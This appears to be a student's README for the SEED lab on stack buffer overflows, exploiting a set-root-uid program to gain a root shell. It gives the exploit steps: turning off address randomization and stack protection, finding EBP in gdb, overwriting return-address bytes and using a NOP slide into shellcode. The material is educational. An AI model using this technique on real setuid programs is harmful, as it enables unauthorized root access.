# Lab Overview
(Copyright c© 2006 - 2014 Wenliang Du, Syracuse University)
The learning objective of this lab is for students to gain first-hand experience with a buffer-overflow vulner-
ability by putting what they have learned about the vulnerability from class into action. Buffer overflow is
defined as the condition in which a program attempts to write data beyond the boundaries of pre-allocated
fixed length buffers. This vulnerability can be utilized by a malicious user to alter the flow control of the
program, even execute arbitrary pieces of code. This vulnerability arises due to the mixing of the storage
for data (e.g. buffers) and the storage for controls (e.g. return addresses): an overflow in the data part can
affect the control flow of the program, because an overflow can change the return address.
This lab builds off of concepts introduced in the overrun lab. While the overrun lab is not a prerequisite
to performing this lab, it may help students are are new to low level references to data structures.
In this lab, students will be given a program with a buffer-overflow vulnerability; their task is to develop
a scheme to exploit the vulnerability and finally gain the root privilege. In addition to the attacks, students
will be guided to walk through several protection schemes that have been implemented in the operating
system to counter against the buffer-overflow attacks. Students need to evaluate whether the schemes work
or not and explain why.

The program has a buffer overflow vulnerability. It first reads an input from a file called “badfile”,
and then passes this input to another buffer in the function bof(). The original input can have a maximum
length of 517 bytes, but the buffer in bof() has only 12 bytes long. Because strcpy() does not check
boundaries, buffer overflow will occur. Since this program is a set-root-uid program, if a normal user can
exploit this buffer overflow vulnerability, the normal user might be able to get a root shell. It should be
noted that the program gets its input from a file called “badfile”. This file is under users’ control. Now, our
objective is to create the contents for “badfile”, such that when the vulnerable program copies the contents
into its buffer, a root shell can be spawned.  
  
Note:   
  Original values of the buffer size have been modified max length 1000 and buffer size 110.

# Implementation
This lab was ran on Ubuntu. I modified the stack buffer size. Then modified the exploit so we can get a root shell using the buffer overflow 
technique. We first needed to find the EBP address which we can get by launching a gdb on the stack, disassemble buffer,
then setting a breakpoint at the beggining of the buffer list. Run the proram and then inspect the ebp register. This address
will help us determine where to skip to our malicious code. Then run the exec.sh which will compile the malicious code,execute and
launch the stack to get the root shell. Running the script will cause the program to nop-slide into a root shell.
Then run cat /root/.secret to get root secret string to prove you are in the root shell.

The buffer indexes that have to be modified depend on the buffer size. My buffer was 110. So we need to modify indexes 122-125 
to include our EBP return address. We get 122 by adding the buffer (110) + 8-bits of padding + size of saved EBP (4).  
* My EBP address was 0xffffd2c8. so we modified the buffer:  
  * buffer[ebp]=0xc8;  
  * buffer[ebp+1]=0xd3; // d3 instead of d2. This is to skip return address  
  * buffer[ebp+2]=0xff;  
  * buffer[ebp+3]=0xff;  
* We also add a copy of the shell call to the end of the buffer to run after the nop-slide.  
  * memcpy(buffer + sizeof(buffer) - sizeof(shellcode),shellcode, sizeof(shellcode));  

Note:   
* There are mechanisms in our OS to prevent this exploits. For this lab you need to turn them off.  
  * Turn off address randomization, otherwise you will have to get lucky that the address lands in the correct place.  
    * $sudo sysctl -w kernel.randomize_va_space=0  
  * Compile stack.c without StackGuard and make it executable  
    * $sudo su  
    * #gcc -m32 -o stack -z execstack -fno-stack-protector stack.c  
    * #chmod 4755 stack  
    * #exit
	
# Getting the EBP Return Address
  * Open stack in gdb and dissasemble buffer  
    * $gdb stack  
    * (gdb) disassemble bof  
  
  * Look for the lea instruction address should look something like:
    * 0xffffd2c8 <+12>: lea -0x76(%ebp), %eax  
  * copy the address and set a breakpoint  
    * (gdb) b* 0xffffd2c8  

  * Run and get ebp return adress  
    * (gdb) run  
    * (gdb) i r $ebp  
  * Copy address and put it in correct buffer index at exploit.c  
